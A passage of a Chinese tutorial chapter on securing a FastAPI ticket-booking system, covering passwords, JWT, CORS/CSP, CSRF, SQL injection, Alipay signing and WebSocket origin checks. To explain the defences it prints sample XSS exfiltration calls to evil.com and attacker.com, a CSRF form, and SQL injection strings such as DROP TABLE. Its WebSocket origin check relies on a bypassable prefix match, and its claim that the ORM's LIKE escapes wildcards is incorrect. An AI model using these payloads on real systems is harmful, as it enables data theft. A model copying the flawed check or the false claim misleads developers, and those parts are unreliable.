# 第 21 章：安全体系完整讲解

> 本章系统讲解票务系统涉及的所有安全防护措施，从密码存储到支付验签，从 WebSocket 防护到容器安全，完整覆盖 OWASP Top 10 的每个风险点。

## 目录

1. [Web 安全全景](#21.1)
2. [密码存储与认证安全](#21.2)
3. [JWT 令牌安全](#21.3)
4. [传输安全：HTTPS/TLS/CORS/CSP](#21.4)
5. [API 安全：速率限制/输入校验/CSRF](#21.5)
6. [支付安全：签名链与防重放](#21.6)
7. [WebSocket 安全](#21.7)
8. [数据库与容器安全](#21.8)
9. [日志安全与监控](#21.9)
10. [OWASP Top 10 对照表](#21.10)

---

## 21.1 Web 安全全景 {#21.1}

### Web 应用安全的三大支柱

安全是一个系统工程，不是单个补丁或中间件就能解决的。本系统的安全架构从三个层面构建：

```text
┌─────────────────────────────────────────────┐
│  1. 传输安全                                │
│  ┌──────────┐  ┌──────────┐  ┌───────────┐ │
│  │ HTTPS    │  │ CORS     │  │ CSP       │ │
│  │ HSTS     │  │ 域名白名单│  │ 脚本来源  │ │
│  └──────────┘  └──────────┘  └───────────┘ │
├─────────────────────────────────────────────┤
│  2. 应用安全                                │
│  ┌──────────┐  ┌──────────┐  ┌───────────┐ │
│  │ JWT 认证  │  │ 速率限制  │  │ 输入校验  │ │
│  │ RBAC     │  │ 账户锁定  │  │ 参数化SQL │ │
│  └──────────┘  └──────────┘  └───────────┘ │
├─────────────────────────────────────────────┤
│  3. 数据安全                                │
│  ┌──────────┐  ┌──────────┐  ┌───────────┐ │
│  │ bcrypt   │  │ AES/RSA  │  │ 环境变量  │ │
│  │ 加盐哈希 │  │ 签名验证  │  │ 不硬编码  │ │
│  └──────────┘  └──────────┘  └───────────┘ │
└─────────────────────────────────────────────┘
```

### 威胁模型

本系统面临的主要威胁：

| 威胁 | 严重性 | 影响 | 防护措施 |
| ------ | -------- | ------ | --------- |
| 超卖（并发下单） | 严重 | 财务损失 | Redis Lua + MySQL 乐观锁 |
| 暴力破解密码 | 严重 | 账户被盗 | 速率限制 + 账户锁定 |
| JWT 伪造 | 严重 | 身份冒充 | HS256 签名 + 复杂密钥 |
| 支付宝通知伪造 | 严重 | 虚假支付 | RSA2 签名验证 |
| XSS | 高 | 令牌窃取 | CSP + 输入编码 |
| CSRF | 高 | 跨站请求 | CORS + Origin 校验 |
| SQL 注入 | 高 | 数据泄露 | ORM 参数化查询 |
| 重放攻击 | 中 | 重复处理 | 幂等键 + 时间戳 |

---

## 21.2 密码存储与认证安全 {#21.2}

### 21.2.1 密码哈希算法对比

| 算法 | 设计目的 | 抗 GPU | 抗 ASIC | 推荐用途 |
| ------ | --------- | -------- | --------- | --------- |
| bcrypt | 密码哈希 | 强 | 强 | ✅ 首选 |
| argon2 | 密码哈希 | 极强 | 极强 | 新项目首选（2015 获奖） |
| scrypt | 密码哈希 | 强 | 极强 | 内存硬依赖 |
| PBKDF2 | 密钥派生 | 弱 | 弱 | ❌ 不推荐用于密码 |
| SHA-256 | 通用哈希 | 极弱 | 极弱 | ❌ 绝不能用于密码 |

**为什么不能直接用 SHA-256 存密码？**

- SHA-256 设计为**快**（1ns 完成一次哈希）
- GPU 每秒可计算数十亿次 SHA-256
- bcrypt 设计为**慢**（可配置工作因子，默认 ~100ms）
- argon2 设计为同时消耗 CPU 和内存资源

**密码哈希流程图：**

```text
用户输入密码 "MyP@ss123"
        ↓
生成随机盐（16 字节）
        ↓
bcrypt(password + salt, rounds=12)
        ↓
输出: $2b$12$VJ7...
 ├── $2b$ = bcrypt 版本
 ├── 12   = 工作因子（2^12 = 4096 轮迭代）
 ├── VJ7... = 盐（22 字符 base64）
 └── 剩余部分 = 哈希值（31 字符 base64）
```

### 21.2.2 密码策略

**项目代码：** `app/services/auth_service.py` — `PasswordPolicy` 类

```python
class PasswordPolicy:
    MIN_LENGTH = 8
    REQUIRE_UPPER = True    # 必须含大写字母
    REQUIRE_LOWER = True    # 必须含小写字母
    REQUIRE_DIGIT = True    # 必须含数字
    REQUIRE_SPECIAL = True  # 必须含特殊字符

    @classmethod
    def validate(cls, password: str) -> str | None:
        if len(password) < cls.MIN_LENGTH:
            return f"密码长度不能少于 {cls.MIN_LENGTH} 位"
        if cls.REQUIRE_UPPER and not re.search(r"[A-Z]", password):
            return "密码必须包含大写字母"
        if cls.REQUIRE_LOWER and not re.search(r"[a-z]", password):
            return "密码必须包含小写字母"
        if cls.REQUIRE_DIGIT and not re.search(r"\d", password):
            return "密码必须包含数字"
        if cls.REQUIRE_SPECIAL and not re.search(r'[!@#$%^&*(),.?":{}|<>_\-]', password):
            return "密码必须包含特殊字符"
        return None
```text

**密码强度数学证明：**

字符集大小 \^ 密码长度 = 可能的密码数

- 纯小写（26），6 位：26⁶ = 3.08 × 10⁸（3 亿，GPU 秒级破解）
- 小写+大写（52），8 位：52⁸ = 5.34 × 10¹³（53 万亿，GPU 年级破解）
- 全字符集（95），8 位：95⁸ = 6.63 × 10¹⁵（6630 万亿，GPU 世纪级）

### 21.2.3 账户锁定机制

**项目代码：** `app/services/auth_service.py` — `AccountLockout` 类

```python
class AccountLockout:
    def __init__(self, redis):
        self.max_attempts = 5          # 最多失败 5 次
        self.lockout_minutes = 15      # 锁定 15 分钟

    async def record_failed_attempt(self, username: str) -> int:
        key = f"lockout:{username}"
        attempts = await self.redis.incr(key)   # 原子递增
        if attempts == 1:
            await self.redis.expire(key, 900)    # 设置 TTL
        return attempts

    async def is_locked(self, username: str) -> bool:
        key = f"lockout:{username}"
        attempts = await self.redis.get(key)
        return attempts and int(attempts) >= self.max_attempts
```

**算法原理：**

```text
登录请求到达
  ↓
检查 Redis key "lockout:admin" 的存在值和 TTL
  ↓
是否有 >= 5 次失败？
  ├── 是 → 拒绝登录，返回"账户已锁定，请 X 秒后再试"
  └── 否 → 验证密码
             ├── 成功 → 删除失败计数 Key（重置计数）
             └── 失败 → INCR 失败计数 + 设置 15 分钟 TTL
```

---

## 21.3 JWT 令牌安全 {#21.3}

### 21.3.1 JWT 结构

JWT（JSON Web Token）由三部分组成，用 `.` 分隔：

```text
header.payload.signature
```

```text
// Header
{
  "alg": "HS256",      // 签名算法
  "typ": "JWT"         // 令牌类型
}

// Payload（本系统示例）
{
  "sub": "42",         // 用户 ID（Subject）
  "exp": 1712345678,   // 过期时间（Expiration）
  "iat": 1712343878,   // 签发时间（Issued At）
  "type": "access",    // 令牌类型（access / refresh）
  "jti": "a1b2c3d4...",// 令牌唯一 ID（JWT ID）
  "iss": "ticket-booking" // 签发者（Issuer）
}

// Signature
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  SECRET_KEY
)
```

### 21.3.2 签名算法：HS256

HS256 是 HMAC-SHA256 对称签名算法。

**签名验证数学公式：**

```text
SIGNATURE = HMAC-SHA256(
    secret = SECRET_KEY,
    message = base64(header) + "." + base64(payload)
)
```

**安全要点：**

- 使用强密钥：`openssl rand -hex 32`（256 位熵）
- 密钥永不离源代码（通过环境变量注入）
- 本系统密钥配置在 `app/config.py` + `.env`

### 21.3.3 令牌层级

```text
access_token  ←────────────── refresh_token
（15-30 分钟）                   （7 天）
     │                                │
  用于 API 认证                 用于获取新 access_token
  随每个请求发送                存储在 localStorage
  频繁更换                      低频使用
```

### 21.3.4 令牌轮换机制

**项目代码：** `app/services/auth_service.py:refresh_token()`

```text
用户使用 refresh_token 请求刷新
  ↓
解码旧 refresh_token，提取 jti
  ↓
将 jti 加入 Redis 黑名单（TTL = 旧令牌剩余有效期）
  ↓
生成新 access_token + 新 refresh_token（含新 jti）
  ↓
返回新令牌给客户端
```

**证明轮换的必要性：**

- 假设 refresh_token 泄露了
- 没有轮换：攻击者可以无限刷新，合法用户无感知
- 有轮换：攻击者使用后，合法用户的旧 refresh_token 失效
- 当合法用户尝试刷新失败时，会发现令牌被窃取

### 21.3.5 令牌黑名单

**项目代码：** `app/utils/jwt.py`

```python
async def blacklist_token(redis: Redis, jti: str, ttl: int = 86400):
    """将 JWT 加入黑名单（吊销）"""
    await redis.setex(f"jwt:blacklist:{jti}", ttl, "1")

async def is_token_blacklisted(redis: Redis, jti: str) -> bool:
    """检查 JWT 是否被吊销"""
    result = await redis.exists(f"jwt:blacklist:{jti}")
    return bool(result)
```text

---

## 21.4 传输安全 {#21.4}

### 21.4.1 HTTPS/TLS 1.3

生产环境必须启用 HTTPS，本章不再赘述 TLS 握手细节。

#### HSTS（Strict-Transport-Security）

```

Strict-Transport-Security: max-age=31536000; includeSubDomains

```text

告诉浏览器：未来 1 年内，只允许通过 HTTPS 访问此站点。

### 21.4.2 CORS 安全配置

**项目代码：** `app/main.py`

```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=["http://localhost:5173"],  // ★ 白名单而非 "*"
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE", "PATCH"],
    allow_headers=["Authorization", "Content-Type", "X-Request-ID"],
)
```

**CORS 预检请求（Preflight Request）流程：**

```text
浏览器发起跨域 POST 请求
  ↓
OPTIONS /api/v1/auth/login
Origin: https://evil.com
  ↓
服务器响应（本系统）：
Access-Control-Allow-Origin: http://localhost:5173  ← 不匹配！
  ↓
浏览器：拒绝跨域请求 ❌
```

**为什么不能用 `allow_origins=["*"]`？**

当 `allow_credentials=True` 时设置 `*` 违反 CORS 规范。任何网站都可以发起携带 cookie/token 的跨域请求，浏览器理论上应拒绝此配置。实际项目中必须指定具体的域名白名单。

### 21.4.3 CSP（Content Security Policy）

**项目代码：** `app/middleware/security.py`

```text
Content-Security-Policy:
  default-src 'self';
  script-src 'self';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data:;
  font-src 'self';
  frame-src 'none';
  object-src 'none';
  base-uri 'self';
  form-action 'self'
```

**CSP 如何防御 XSS：**

假设攻击者注入 `<script>fetch('/api/v1/users').then(r=>r.json()).then(d=>fetch('https://evil.com?d='+JSON.stringify(d)))</script>`

CSP 策略 `script-src 'self'` 告诉浏览器：**只允许从同源加载的脚本执行**。内联 `<script>` 标签（行内脚本）被阻止执行（除非使用 nonce 或 hash）。

### 21.4.4 安全标头总结

| 标头 | 值 | 作用 |
| ------ | ---- | ------ |
| `X-Content-Type-Options` | `nosniff` | 防止 MIME 类型嗅探攻击 |
| `X-Frame-Options` | `DENY` | 防止点击劫持（不允许 iframe 加载） |
| `X-XSS-Protection` | `1; mode=block` | 启用浏览器 XSS 过滤器 |
| `Strict-Transport-Security` | `max-age=31536000` | 强制 HTTPS（仅 production） |
| `Content-Security-Policy` | 见上 | 限制资源加载来源 |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | 控制 Referer 头信息 |
| `Permissions-Policy` | `camera=(), microphone=()` | 禁用不需要的浏览器功能 |

---

## 21.5 API 安全 {#21.5}

### 21.5.1 速率限制（Rate Limiting）

**项目代码：** `app/middleware/ratelimit.py`

滑动窗口算法实现：

```python
# Redis Sorted Set 结构
KEY: ratelimit:auth:ip:192.168.1.1
成员: 每次请求的时间戳（float）
Score: 时间戳（用于排序和范围查询）

# 每次请求：
ZREMRANGEBYSCORE key 0 <now - window>  # 移除过期记录
ZCARD key                                # 统计窗口内请求数
if 请求数 > 限制 → 返回 429
ZADD key <now> <now>                     # 添加当前请求
EXPIRE key <window + 60>                 # 清理过期 Key
```text

**端点的速率限制配置：**

| 端点 | 限制 | 说明 |
| ------ | ------ | ------ |
| `/auth/login` | 10 次/分钟 | 暴力破解防护 |
| `/auth/register` | 20 次/分钟 | 账户创建泛滥防护 |
| `/payments/alipay/notify` | 特殊限制 | 太频繁可能为重放攻击 |
| 其他 API | 100 次/分钟 | 常规限流 |

### 21.5.2 输入校验

本系统使用三层输入校验：

```

第一层：Pydantic Schema（类型 + 长度 + 正则）
  └→ 示例：UserCreate.username = Field(min_length=3, max_length=50, pattern=r"^[a-zA-Z0-9_]+$")

第二层：业务逻辑校验（服务层）
  └→ 示例：PasswordPolicy.validate() 校验密码强度

第三层：请求体大小限制（中间件）
  └→ MAX_REQUEST_BODY_SIZE = 1MB

```text

### 21.5.3 CSRF 防护

本系统使用 Bearer Token 认证，不使用 cookie 认证。CSRF 攻击的前提是浏览器自动携带认证凭据（cookie），使用 `Authorization: Bearer <token>` 的请求不会被浏览器自动发送，因此本系统天然免疫传统 CSRF 攻击。

```

❌ Cookie 认证（易受 CSRF）：
  <img src="https://bank.com/transfer?to=attacker&amount=10000">
  → 浏览器自动携带 bank.com 的 cookie，请求成功

✅ Bearer Token 认证（免疫 CSRF）：
  <img src="..." → 没有 Authorization 头，请求失败

```text

### 21.5.4 SQL 注入防护

本系统使用 SQLAlchemy ORM，所有查询都通过参数化接口执行：

```python
# ✅ 安全：ORM 参数化查询
select(Event).where(Event.title.like(f"%{keyword}%"))
# → 底层使用 PREPARE + BIND，keyword 被转义为字符串字面量

# ❌ 危险：字符串拼接查询（本系统从不使用）
# f"SELECT * FROM events WHERE title LIKE '%{keyword}%'"  # SQL 注入！
```

---

## 21.6 支付安全 {#21.6}

### 21.6.1 RSA 签名原理

支付宝使用 RSA（Rivest-Shamir-Adleman）非对称加密算法进行签名和验签。

**密钥对：**

```text
应用私钥（app_private_key.pem）— 服务器保存，绝不泄露
  ↓ RSA2（SHA256WithRSA）签名
支付宝公钥（alipay_public_key.pem）— 从支付宝平台下载
  ↓ RSA2 验签
```

**签名不可伪造性证明：**

```text
前提：
1. 只有持有应用私钥的服务器才能生成有效签名
2. 支付宝持有应用公钥（从平台上传）
3. 攻击者没有应用私钥

推理：
- 伪造支付通知：需生成有效签名
- 生成有效签名：需应用私钥
- 攻击者没有应用私钥
- ∴ 攻击者无法伪造支付通知（除非私钥泄露）
```

### 21.6.2 签名生成流程

```text
参数排序（按 key 字典序）：
app_id=202100...&biz_content={"out_trade_no":"TKT202401010001"...}&charset=utf-8&...
  ↓
拼接为待签名字符串
  ↓
RSA2(SHA256WithRSA) 签名
  ↓
sign=base64(signature)
  ↓
添加到请求参数中发送给支付宝
```

### 21.6.3 四层防重放防御

**项目代码：** `app/services/payment_service.py`

```text
支付宝异步通知 POST /api/v1/payments/alipay/notify
  ↓
Layer 1: RSA2 签名验证
  验证通知数据是否来自支付宝
  失败 → 返回 failure ❌
  ↓
Layer 2: 交易状态检查
  仅处理 trade_status == "TRADE_SUCCESS"
  其他状态 → 返回 success（避免支付宝重推）✅
  ↓
Layer 3: 幂等性检查
  Redis SETNX alipay:processed:{order_no} + TTL=86400
  已存在 → 返回 success（防止重复处理）✅
  ↓
Layer 4: 金额校验
  通知金额 Decimal 比对数据库订单金额
  不匹配 → 返回 failure + 删除幂等键 ❌
  ↓
确认支付：订单状态 → paid
```

### 21.6.4 幂等键数学证明

```text
问题：
  支付宝可能重复发送同一通知（网络问题、超时重试）
  不处理：丢失支付确认
  重复处理：订单状态被多次修改

解决方案 - 幂等键：
  key = "alipay:processed:{order_no}"
  value = "1"
  SETNX：如果 key 存在，SET 失败（原子操作）
  TTL = 86400 秒（24 小时自动清理）

证明：
  第一次通知到达：
    SETNX → 成功（key 不存在）
    → 处理订单
  第二次通知到达：
    SETNX → 失败（key 已存在）
    → 返回 success（不重复处理）
  ∴ exactly-once 语义保证
```

---

## 21.7 WebSocket 安全 {#21.7}

### 21.7.1 CSWSH（Cross-Site WebSocket Hijacking）

WebSocket 不受同源策略限制！这意味着恶意网站可以打开 WebSocket 连接到任意后端。

**攻击场景：**

```text
用户已登录 https://ticket-booking.com
  ↓
用户访问 https://evil.com
  ↓
evil.com 的 JavaScript：
  new WebSocket("wss://ticket-booking.com/ws/shows/1/seats")
  ↓
⚠️ 没有 Origin 校验：连接成功
  恶意脚本监听所有座位更新
```

**防护措施（本系统实现）：**

```python
async def verify_ws_origin(websocket: WebSocket) -> bool:
    origin = websocket.headers.get("origin", "")
    if not origin:
        return True  # 非浏览器客户端放行
    allowed = {"http://localhost:5173", "http://localhost:8000"}
    return any(origin.startswith(a) for a in allowed)
```text

### 21.7.2 WebSocket 消息安全

**项目代码：** `app/routers/ws.py`

| 安全措施 | 实现 |
| ---------- | ------ |
| JWT 令牌认证 | 通过 `?token=xxx` 查询参数传递 JWT |
| 消息大小限制 | `len(raw_data) > 64KB` 拒绝 |
| 消息类型白名单 | 仅允许 `select`, `release`, `ping` |
| 座位 ID 格式校验 | 正则：大写字母 + 数字，长度 2-5 |
| 用户身份防伪 | user 从 JWT claims 提取，非客户端提供 |
| 异常日志 | 捕获异常时记录详细日志（非静默吞没） |

---

## 21.8 数据库与容器安全 {#21.8}

### 21.8.1 数据库安全

| 措施 | 说明 |
| ------ | ------ |
| ORM 参数化查询 | 杜绝 SQL 注入 |
| 乐观锁 | 防止并发数据竞争（version 字段） |
| 最小权限用户 | 非 root 连接数据库（docker-compose 创建 ticket_app 用户） |
| 内部网络 | 数据库端口不暴露到主机 |
| 连接池 | pool_pre_ping 检测断连 |

### 21.8.2 Docker 安全

| 措施 | 实现 |
| ------ | ------ |
| 非 root 运行 | `USER ticket`（Dockerfile 第 29 行） |
| `.env` 不进入镜像 | `.dockerignore` 排除 |
| Redis 密码 | `requirepass ${REDIS_PASSWORD}` |
| 端口不暴露到主机 | 使用 `expose` 而非 `ports` |
| 最小基础镜像 | `python:3.12-slim` |

### 21.8.3 环境变量管理

```

# ❌ 错误做法：硬编码密钥

SECRET_KEY = "dev-secret-key-change-in-production"

# ✅ 正确做法：从环境变量读取

SECRET_KEY: str = Field(...)  # 无默认值，启动时必填

# .env 文件（本地开发，永远不提交到 Git）

SECRET_KEY=openssl rand -hex 32 生成的值
DB_PASSWORD=强密码

```text

### 21.8.4 生产环境检查清单

| # | 检查项 | 状态 |
| --- | -------- | ------ |
| 1 | SECRET_KEY 已改为随机长字符串 | ☐ |
| 2 | DB_PASSWORD 已改为强密码 | ☐ |
| 3 | CORS_ORIGINS 已设为前端域名白名单 | ☐ |
| 4 | ENV=production（禁用调试信息和 docs） | ☐ |
| 5 | HTTPS 已配置（Nginx/反向代理） | ☐ |
| 6 | Redis 密码已设置 | ☐ |
| 7 | MySQL 专用用户已创建（非 root） | ☐ |
| 8 | `.env` 已加入 `.gitignore` | ☐ |
| 9 | 日志使用 JSON 格式 | ☐ |
| 10 | 安全标头已配置（CSP/HSTS/XFO） | ☐ |
| 11 | 速率限制已启用 | ☐ |
| 12 | 数据库备份已配置 | ☐ |
| 13 | 容器以非 root 用户运行 | ☐ |
| 14 | Swagger/ReDoc 已禁用 | ☐ |
| 15 | 支付宝公钥已配置（启用验签） | ☐ |

---

## 21.9 日志安全与监控 {#21.9}

### 21.9.1 日志脱敏

**项目代码：** `app/utils/logging_config.py`

```python
SENSITIVE_FIELDS = re.compile(
    r"password|secret|token|key|authorization|credential|credit_card|cvv",
    re.IGNORECASE
)

def _mask_sensitive_events(logger, log_method, event_dict):
    for key in list(event_dict.keys()):
        if SENSITIVE_FIELDS.search(key):
            event_dict[key] = "[REDACTED]"
    return event_dict
```

**脱敏效果：**

```json
// 脱敏前（危险！）
{"password": "MyP@ss123", "token": "eyJhbGciOiJIUzI1NiIs...", "event": "login"}

// 脱敏后（安全）
{"password": "[REDACTED]", "token": "[REDACTED]", "event": "login"}
```text

### 21.9.2 审计日志关键事件

| 事件 | 日志级别 | 记录内容 |
| ------ | --------- | --------- |
| 登录成功 | INFO | user_id, username |
| 登录失败 | WARNING | username, attempts |
| 账户锁定 | WARNING | username, ttl |
| 订单创建 | INFO | order_no, user_id, amount |
| 支付通知 | INFO | order_no, trade_no |
| 验签失败 | WARNING | out_trade_no |
| WebSocket 连接 | INFO | user_id, event_id |
| 退款 | INFO | order_id, order_no |

---

## 21.10 OWASP Top 10 对照表 {#21.10}

| OWASP Top 10 (2021) | 本系统防护 | 相关文件 |
| -------------------- | ----------- | --------- |
| A01: 失效的访问控制 | RBAC 角色检查（admin/organizer/user）、订单归属校验 | `middleware/auth.py` |
| A02: 加密失败 | bcrypt 加盐哈希、HS256 JWT 签名、HTTPS | `utils/security.py` |
| A03: 注入 | SQLAlchemy ORM 参数化查询、座位 ID 正则校验 | `services/order_service.py` |
| A04: 不安全设计 | 分层防御（Redis + MySQL）、幂等键 | `services/payment_service.py` |
| A05: 安全配置错误 | CORS 白名单、安全标头、DEBUG 关闭 | `middleware/security.py` |
| A06: 易受攻击组件 | `pip-audit` 依赖扫描、最小 Docker 镜像 | `Dockerfile` |
| A07: 认证和验证失败 | 密码策略、账户锁定、令牌轮换 | `services/auth_service.py` |
| A08: 数据完整性失败 | JWT 签名、支付宝 RSA2 验签、乐观锁 | `utils/jwt.py` |
| A09: 安全日志和监控失败 | structlog JSON 日志、审计事件、日志脱敏 | `utils/logging_config.py` |
| A10: SSRF | 请求体大小限制、URL 白名单 | `middleware/validation.py` |

---

## 📁 项目代码参考

| 文件 | 说明 |
| ------ | ------ |
| `app/middleware/security.py` | `SecurityHeadersMiddleware`：CSP、HSTS、X-Frame-Options |
| `app/middleware/ratelimit.py` | 全局限流器（基于 Redis 令牌桶） |
| `app/middleware/auth.py` | JWT 认证 + `RoleChecker` + Token 黑名单 |
| `app/middleware/validation.py` | 请求体大小限制 |
| `app/main.py` | TrustedHostMiddleware 配置（允许的 Host 白名单） |
| `app/services/behavior_service.py` | 防刷检测：频率限制、并发控制、IP 检查 |

**CSP 策略**（`app/middleware/security.py` 中配置）：

```

default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';
img-src 'self' data:; frame-src 'none'; connect-src 'self' ws:;

```text

## 本章小结

本章从密码存储到支付验签，从传输安全到容器安全，完整覆盖了票务系统的安全体系。关键 takeaways：

1. **纵深防御**：任何单一防护都可能被绕过，多层防御才可靠
2. **不要信任用户输入**：Pydantic 校验 + 服务层校验 + 中间件校验
3. **加密不能偷懒**：密码用 bcrypt 不是 SHA-256，签名用 RSA2 不是 base64
4. **安全是配置问题**：SECRET_KEY、CORS、DEBUG 等配置项决定安全基线
5. **日志是最后防线**：记录关键事件 + 脱敏敏感字段 + JSON 格式便于分析

**下一章预告：** 第 22 章 — 项目上线与运维指南（Nginx 生产配置、Docker Compose 部署、日常运维、故障排查）

---

## 11. 原理深入（补充）

### 11.1 CSP 策略详解

#### CSP 的每个指令

```

Content-Security-Policy 的每个指令详解：

default-src 'self';
  默认资源加载策略：只允许同源（协议+域名+端口）
  未单独指定的资源类型都遵循此规则

script-src 'self';
  脚本加载策略：只允许加载同源脚本
  内联 <script> 标签默认被禁止！
  → 如果项目需要内联脚本（如 Vue 的 SPA 初始化），
    需要使用 'unsafe-inline' 或 nonce/hash 机制

style-src 'self' 'unsafe-inline';
  样式加载策略：允许同源样式 + 内联样式
  'unsafe-inline' 允许 <style> 标签和 style 属性
  → 本系统使用 Vue 组件化，样式写在组件内部，所以需要内联样式

img-src 'self' data:;
  图片加载策略：允许同源图片 + data: URI
  data: 允许 base64 内联图片（小程序图标等）

font-src 'self';
  字体加载策略：只允许同源字体
  如果使用 CDN 字体（如 Google Fonts），需要添加域名

frame-src 'none';
  框架加载策略：完全禁止 <iframe> 嵌入
  防止点击劫持（Clickjacking）攻击
  等价于 X-Frame-Options: DENY

object-src 'none';
  插件对象策略：禁止 <object> <embed> <applet> 标签
  防止 Flash/Java 等过时插件的安全漏洞

base-uri 'self';
  基础 URL 策略：限制 <base> 标签的 href 值
  防止攻击者篡改相对 URL 的基础地址

form-action 'self';
  表单提交策略：限制表单只能提交到同源地址
  防止 CSRF 攻击：攻击者无法构造提交到本网站的表单

connect-src 'self' ws:;
  连接策略：限制 fetch/XHR/WebSocket 的连接地址
  'self' + ws: 允许同源的 HTTP 和 WebSocket 连接

```text

#### CSP 的各种绕过场景

```

场景1：script-src 'self' 被绕过
  攻击手段：如果同源存在 JSONP 接口，攻击者可利用 JSONP 执行代码
  防御：禁用 JSONP 接口，或使用 'strict-dynamic'

场景2：script-src 'unsafe-inline' 开放内联脚本
  攻击手段：注入 <script>alert(document.cookie)</script>
  防御：使用 nonce（一次性随机数）替代 'unsafe-inline'
    Content-Security-Policy: script-src 'nonce-{random}'
    <script nonce="{random}">/*只执行带正确 nonce 的脚本*/</script>

场景3：img-src 被滥用
  攻击手段：<img src="<http://attacker.com/steal?cookie="+document.cookie>>
  防御：将 img-src 严格限制在已知 CDN 域名内

场景4：connect-src 泄露数据
  攻击手段：fetch('<http://attacker.com/exfil>', { body: data })
  防御：禁止使用 'unsafe-inline' 风格的 connect-src 限制

```text

#### CSP 报告模式

```python
# 使用 Content-Security-Policy-Report-Only 模式
# 只报告违规行为，不阻止（用于灰度测试）

# app/middleware/security.py
response.headers["Content-Security-Policy-Report-Only"] = (
    "default-src 'self'; "
    "script-src 'self'; "
    "report-uri /api/v1/csp-report;"  # 违规上报地址
)

# 接收 CSP 违规报告的路由
@router.post("/csp-report")
async def csp_report(request: Request):
    """
    接收 CSP 违规报告
    浏览器 POST JSON 格式的违规详情到此端点
    """
    report = await request.json()
    app.logger.warning(
        f"CSP 违规: {report['csp-report']['blocked-uri']}",
        extra={"csp_report": report},
    )
    return {"status": "received"}
```

### 11.2 CSRF 防护详解

#### CSRF 攻击原理

```text
CSRF（Cross-Site Request Forgery，跨站请求伪造）的本质：

前提条件：
  用户已登录 A 网站，A 网站使用 Cookie 存储 session/token
  浏览器在访问任意网站时会自动携带 A 网站的 Cookie

攻击步骤：
  1. 用户登录 A 网站（银行网站），浏览器保存了 A 的 Cookie
  2. 用户访问 B 网站（攻击者网站），没有关闭 A 网站的标签页
  3. B 网站的页面中有一个自动提交的表单或图片标签：
     <img src="http://bank.com/transfer?to=attacker&amount=10000">
     <!-- 或者 -->
     <form action="http://bank.com/transfer" method="POST">
       <input name="to" value="attacker">
       <input name="amount" value="10000">
     </form>
     <script>document.forms[0].submit();</script>
  4. 浏览器自动携带 bank.com 的 Cookie 发送请求
  5. A 网站验证 Cookie 通过 → 转账成功！

为什么 Bearer Token 认证可以免疫 CSRF？：
  Cookie 是浏览器自动携带的（无论请求从哪里发起）
  Authorization header 需要 JavaScript 显式设置
  跨域的 <img>/<form> 无法设置 Authorization header
  → 因此攻击者无法伪造携带 Bearer Token 的请求
```

#### 本系统的 CSRF 防护体系

```text
本系统使用 Bearer Token 认证（非 Cookie 认证），天然免疫传统 CSRF。

但仍需注意以下 CSRF 相关风险：

1. CORS 配置不当导致的风险
   如果 CORS 配置为 allow_origins=["*"] 且 allow_credentials=True，
   任何网站都可以通过 fetch API 带 Cookie 跨域请求。
   → 本系统配置严格的白名单 + 未使用 Cookie 认证

2. 支付宝异步通知端点的 CSRF 风险
   /api/v1/payments/alipay/notify 不使用 JWT 认证（支付宝不支持自定义 header）
   但支付宝通知有 RSA2 签名验证 → 无法伪造
   → 第三层防御（签名验证）提供了 CSRF 防护

3. WebSocket 的跨源风险（CSWSH）
   WebSocket 不受同源策略限制，所有源都能发起 WebSocket 连接。
   → 通过 Origin 头校验 + JWT 令牌认证双重防护
```

#### 如果将来需要 Cookie 认证

```python
# 如果将来改为 Cookie 认证，必须添加 CSRF Token 保护：

from fastapi import Request, HTTPException
import secrets


def generate_csrf_token() -> str:
    """生成随机 CSRF Token"""
    return secrets.token_urlsafe(32)


async def csrf_protect(request: Request):
    """
    CSRF 保护中间件（Double Submit Cookie + Custom Header 模式）

    原理：
    1. 服务器生成 CSRF Token 写入 Cookie
    2. 前端读取 Cookie 中的 CSRF Token
    3. 每个敏感请求在自定义 header 中携带 CSRF Token
    4. 服务器验证 Cookie 中的 Token == Header 中的 Token
    5. 攻击者无法读取 Cookie 内容（同源策略保护）
    """
    if request.method in ("GET", "HEAD", "OPTIONS"):
        return  # 安全方法不需要 CSRF

    # 从 Cookie 获取 Token
    cookie_token = request.cookies.get("csrf_token")
    # 从 Header 获取 Token
    header_token = request.headers.get("X-CSRF-Token")

    if not cookie_token or not header_token:
        raise HTTPException(status_code=403, detail="CSRF Token 缺失")

    if not secrets.compare_digest(cookie_token, header_token):
        raise HTTPException(status_code=403, detail="CSRF Token 不匹配")
```text

### 11.3 SQL 注入防护详解

#### SQL 注入原理

```

SQL 注入的本质：用户输入被当作 SQL 代码执行

原始代码（有注入漏洞）：
  username = request.form["username"]
  password = request.form["password"]
  query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"

# 用户输入 username = admin' --

# 实际执行的 SQL

# SELECT * FROM users WHERE username='admin' -- ' AND password='...'

# → 绕过密码验证！ WHERE 条件被注释掉了

更严重的注入：
  username = '; DROP TABLE users; --

# → 删表

  username = ' UNION SELECT * FROM credit_cards; --

# → 窃取其他表数据

```text

#### 本系统的 SQL 注入防护

```

本系统使用 SQLAlchemy ORM，所有查询都通过参数化接口。

然而 ORM 并不能 100% 防御注入，需要开发者注意：

1. ✅ SQLAlchemy ORM 参数化查询（安全）
   session.execute(select(User).where(User.username == username))
   → 底层使用 PREPARE + BIND
   → username 始终被当作字符串值，不参与 SQL 语法解析

2. ✅ SQLAlchemy text() 的绑定参数（安全）
   session.execute(text("SELECT * FROM users WHERE id = :id"), {"id": user_id})
   → 使用 :param 绑定参数

3. ❌ SQLAlchemy text() 的字符串拼接（危险！）
   session.execute(text(f"SELECT * FROM users WHERE id = {user_id}"))
   → f-string 拼接，存在注入风险！

4. ✅ LIKE 查询的安全写法（安全）
   session.execute(
       select(Event).where(Event.title.like(f"%{keyword}%"))
   )
   → ORM 自动转义 keyword 中的特殊字符
   → keyword 中的 % 和 _ 不会被当作通配符

5. ❌ LIKE 查询的原始 SQL（危险）
   session.execute(
       text(f"SELECT * FROM events WHERE title LIKE '%{keyword}%'")
   )
   → keyword 中的 SQL 特字符会被执行

```text

#### SQL 注入防御清单

```python
# 安全查询模式清单

# ✅ 安全：ORM 标准查询
session.execute(
    select(User).where(User.username == username)
)

# ✅ 安全：ORM 关系查询
session.execute(
    select(Order).join(User).where(User.id == user_id)
)

# ✅ 安全：ORM 聚合查询
session.execute(
